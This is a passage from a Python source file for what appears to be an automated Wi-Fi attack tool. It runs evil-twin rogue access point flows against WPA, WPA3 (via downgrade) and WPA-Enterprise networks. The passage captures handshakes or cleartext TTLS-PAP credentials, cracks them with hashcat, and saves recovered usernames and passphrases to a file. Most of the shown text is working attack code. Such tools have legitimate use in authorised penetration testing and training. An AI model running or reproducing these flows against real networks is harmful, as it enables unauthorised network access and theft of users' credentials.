        print()
        print(f"       {RDY}►{R}  capture complete  ·  {check_label}")
        if found:
            print(f"       {WHT}artefact: {found[0]}{R}")
        print(f"       {DIM}recovery available later from the analysis console{R}")
        print()
        sys.stdout.flush()
        _flow_wrapup(target, flow, log)
        return captured

    _recovery_handoff(log); t_recovery = time.time()
    passphrase = None; method_str = f"hashcat -m {hashcat_mode}"; extra_fields = []; cred_label = "password" if flow == "ENTERPRISE" else "passphrase"
    if flow == "ENTERPRISE":
        cleartext = _enterprise_check_cleartext(folder)
        if cleartext: user, pwd = cleartext[0]; passphrase = pwd; method_str = "cleartext · TTLS-PAP"; extra_fields.append(("username", user)); log("success", f"cleartext captured  ·  {user}")
    if not passphrase:
        # auto flow is hashcat-only by design; john is exposed solely
        # in the manual analysis console (training / operator choice).
        # Ignore CFG["enterprise_method"] here so a stale config can
        # never silently switch auto to john.
        _method  = "hashcat"; mask = (CFG.get("default_mask") or "").strip(); wordlist = _wordlist_path(); use_mask = bool(mask) and mask not in ("", "0") and _mask_valid(mask)
        if flow == "ENTERPRISE" and _method == "john": base = "john netntlm"; passphrase, _src = _run_john_in_conductor(target, log)
        else: base = f"hashcat -m {hashcat_mode}"; passphrase, _src = _run_hashcat_in_conductor(target, log, hashcat_mode)
        # method_str reflects strategy attempted whether or not cracker succeeded
        if _src == "potfile": method_str = f"{base} · potfile"
        elif use_mask:        method_str = f"{base} · mask {mask}"
        elif wordlist:        method_str = f"{base} · wordlist {os.path.basename(wordlist)}"
        else:                 method_str = base
    if flow == "ENTERPRISE" and passphrase and not any(k == "username" for k, _ in extra_fields):
        user = _enterprise_extract_username(folder)
        if user: extra_fields.append(("username", user))
    elapsed = time.time() - t_recovery
    if passphrase:
        _show_step(log, flow, 3, body_lines=[f"{method_str}  ·  {passphrase}"])
        with open(os.path.join(folder, "target_info.txt"), "a") as f:
            if flow == "ENTERPRISE":
                for k, v in extra_fields:
                    if k == "username": f.write(f"USERNAME:          {v}\n")
                f.write(f"PASSWORD:          {passphrase}\n")
            else: f.write(f"PASSPHRASE:        {passphrase}\n")
        display_fields = list(extra_fields) + [(cred_label, passphrase)]
        _display_recovery_result(success=True, essid=target["essid"], bssid=target["bssid"], method=method_str, fields=display_fields, elapsed_seconds=elapsed, log=log)
    else:
        _show_step(log, flow, 3, body_lines=["not recovered  ·  see report"])
        _strat_label = "mask" if use_mask else "wordlist"
        _strat_value = (mask if use_mask
                        else os.path.basename(_wordlist_path() or "(none)"))
        _fail_fields = [("hash", os.path.basename(found[0]) if found else "-"),
                        (_strat_label, _strat_value)]
        if flow == "WPA3":
            _t_pmf = target.get("pmf", "-")
            if _t_pmf == "req":
                _fail_fields.append(
                    ("note", "pure SAE (PMF req): client must connect manually"))
            else:
                _fail_fields.append(
                    ("note", "if target is pure SAE: manual client action required"))
        _display_recovery_result(success=False, essid=target["essid"], bssid=target["bssid"], method=method_str, fields=_fail_fields, elapsed_seconds=elapsed, log=log)
    _flow_wrapup(target, flow, log); return captured

def wpa_personal_flow_auto(target, panes):
    return _evil_twin_flow(target, panes, "WPA_PERSONAL", ap_type="personal", check_fn=lambda f: _poll_mana_hash(f), check_label="handshake captured", hashcat_mode=22000)

def wpa3_flow_auto(target, panes):
    target["ap_type"] = "wpa3"; target["rogue_profile"] = _rogue_profile_for("wpa3")
    return _evil_twin_flow(target, panes, "WPA3", ap_type="wpa3", check_fn=lambda f: _poll_mana_hash(f), check_label="handshake captured  ·  WPA3 downgrade", hashcat_mode=22000)

def enterprise_flow_auto(target, panes):
    return _evil_twin_flow(target, panes, "ENTERPRISE", ap_type="enterprise", check_fn=lambda f: _poll_credentials(f), check_label="credentials captured", hashcat_mode=5500)

FLOW_RUNNERS = {
    "OPEN":            open_flow_auto,
    "WEP":             wep_flow_auto,
    "WPA_PERSONAL":    wpa_personal_flow_auto,
    "WPA-PERSONAL":    wpa_personal_flow_auto,   # alias
    "WPA3":            wpa3_flow_auto,
    "ENTERPRISE":      enterprise_flow_auto,
    "WPA-ENTERPRISE":  enterprise_flow_auto,     # alias
}

# ═══════════════════════════════════════════════════════════════════
# SECTION 14 · ENTRY
# ═══════════════════════════════════════════════════════════════════

def _root_required_block():
    """Print a clear message when not run as root and exit cleanly.
    Without root, WSA cannot manipulate wireless hardware and cannot
    write to assessment files created by prior root runs."""
    print()
    print("  wsa requires root")
    print()
    print("    wireless operations need raw socket access and")
    print("    CAP_NET_ADMIN (interface mode changes, packet injection)")
    print()
    print("  run with:")
    print()
    print(f"    sudo python3 {os.path.basename(__file__)}")
    print()
    sys.exit(1)


def main():
    args = parse_cli_args()

    if os.geteuid() != 0:
        _root_required_block()

    if args.role:
        dispatch_role(args.role)
        return

    if args.auto:
        if args.wordlist and args.mask:
            print(f"\n {ERR}ERROR:{R} cannot use --wordlist and --mask simultaneously.\n")
            sys.exit(1)
        
        bootstrap_tmux()
        install_signals()
        run_auto_assessment(args)
        # fall through to interactive menu (Option A)
        engine_loop()
        return

    # Default: Interactive Manual Conductor
    engine_loop()

if __name__ == "__main__":
    main()

